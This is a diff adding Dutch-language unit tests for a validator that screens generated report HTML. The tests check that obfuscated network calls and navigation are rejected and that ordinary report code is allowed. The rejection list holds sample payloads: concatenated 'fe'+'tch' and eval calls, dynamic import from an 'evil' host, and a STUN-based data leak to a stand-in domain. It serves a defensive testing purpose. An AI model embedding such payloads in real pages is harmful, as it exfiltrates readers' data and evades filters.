@@ -110,6 +110,55 @@ test('HTML-controle: geen netwerk, geen externe bronnen, geen navigatie', () => 
   for (const html of bad) assert.ok(checkReportHtml(html).length > 0, `had afgekeurd moeten worden: ${html}`);
 });
 
+test('HTML-controle: ook verstopte en opgebouwde omwegen naar buiten', () => {
+  // Elk van deze kwam door de letterlijke regels hierboven; een pagina die door
+  // ingevoegde tekst in de gegevens zo was geschreven, lekte bij elke keer openen.
+  const bad = [
+    `<script>window['fe'+'tch']('/x')</script>`,
+    `<script>globalThis['loc'+'ation'] = 'https://evil'</script>`,
+    `<script>self["op"+"en"]('https://evil')</script>`,
+    `<script>(0, eval)('1')</script>`,
+    `<script>[].constructor.constructor('return 1')()</script>`,
+    `<script>setTimeout("alert(1)", 1)</script>`,
+    `<script>import('https://evil/x.js')</script>`,
+    `<script>new RTCPeerConnection({ iceServers: [{ urls: 'stun:x.evil.test' }] })</script>`,
+    `<script>const c = { iceServers: [] }</script>`,
+    `<script>const u = 'stun:' + data + '.evil.test'</script>`,
+    `<script>const a = document.createElement('a'); a.href = 'https:' + '//evil'; a.click()</script>`,
+    `<script>el.setAttribute('src', x)</script>`,
+    `<a href="https:\\\\evil.example">x</a>`,
+    `<a href="javascript:alert(1)">x</a>`,
+    `<script>document.createElement('ifr' + 'ame'); document.createElement("iframe")</script>`,
+    `<script>document.write('<p>')</script>`,
+    `<script>new DOMParser()</script>`,
+    `<script>Reflect.get(window, 'x')</script>`,
+    `<script>Object.getOwnPropertyNames(window)</script>`,
+    `<script>for (const k in window) {}</script>`,
+    `<script>(() => {}).constructor('return 1')()</script>`,
+    `<div onclick="window['fe' + 'tch']('/x')">x</div>`,
+  ];
+  for (const html of bad) assert.ok(checkReportHtml(html).length > 0, `had afgekeurd moeten worden: ${html}`);
+});
+
+test('HTML-controle: gewone rapportagecode blijft toegestaan', () => {
+  // De valkuilen van de strengere regels: RF.top in een variabele `top`, een
+  // klasse met constructor, data-attributen, een anker binnen de pagina, en de
+  // gewone insertAdjacentHTML (het kader zelf houdt frames tegen).
+  const ok = [
+    `<div id="x"></div><script>const top = RF.top(RF.rows('omzet'), 5, 'omzet'); document.getElementById('x').textContent = top[0] ? top[0].client_name : '';</script>`,
+    `<script>class Teller { constructor(n) { this.n = n; } } const t = new Teller(3);</script>`,
+    `<div data-tab="omzet"></div><a href="#omzet">Omzet</a><script>document.querySelector('[data-tab]').setAttribute('data-actief', '1')</script>`,
+    `<div id="l"></div><script>document.getElementById('l').insertAdjacentHTML('beforeend', '<p>' + RF.esc('Jansen') + '</p>')</script>`,
+    `<p>De evaluatie van dit kwartaal: de omzet steeg.</p>`,
+    `<img src="data:image/png;base64,iVBORw0KGgo=" alt="">`,
+    // Uit de review: tekst op de pagina is geen script, en mail- en bellinks mogen.
+    `<p>Btw verlegd bij import (rubriek 4a)</p><p>Diensten import (buiten EU)</p>`,
+    `<a href="mailto:jan@jansen.nl">Mail Jan</a> <a href="tel:+31201234567">Bel</a>`,
+    `<script>const v = RF.data.x; if (v && v.constructor === Object) {} const stand = { turn: 1 };</script>`,
+  ];
+  for (const html of ok) assert.deepEqual(checkReportHtml(html), [], `had goedgekeurd moeten worden: ${html}`);
+});
+
 test('welke datasets de HTML gebruikt', () => {
   const html = `RF.rows('omzet'); RF.totals("kosten"); RF.data.uren.groups; RF.meta['tickets'].error; RF.rows(x)`;
   assert.deepEqual(referencedDatasetKeys(html).sort(), ['kosten', 'omzet', 'tickets', 'uren']);
